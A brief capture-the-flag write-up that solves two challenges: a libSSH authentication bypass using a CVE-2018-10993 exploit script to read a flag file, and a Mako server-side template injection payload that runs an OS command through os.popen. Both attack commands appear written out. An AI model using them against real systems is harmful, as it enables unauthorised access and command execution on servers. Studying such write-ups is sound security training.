# CyberSecurity



libssh

Flag format: CTF{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
libssh is a C library that enables you to write a program that uses the SSH protocol. With it, you can remotely execute programs, transfer files, or use a secure and transparent tunnel for your remote programs.
using Nmap to scan the port 
nmap –sV –sC –p port ip -Pn
after scanning we can use CVE-2018-10993 libSSH authentication bypass exploit
cve-2018-10993.py ip -p port -31367 -c "cd ..;cat flag.txt"
ctf

shark

Flag format: CTF{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
curl is a command-line tool for getting or sending data including files using URL syntaxi
using curl we can find out that the website is uisng Werkzeug web application library
we can use Server-Side Template Injection and send MAKO payload using burp suite

name=<%
<%
import os
x=os.popen('cat flag').read()
%>
${x}





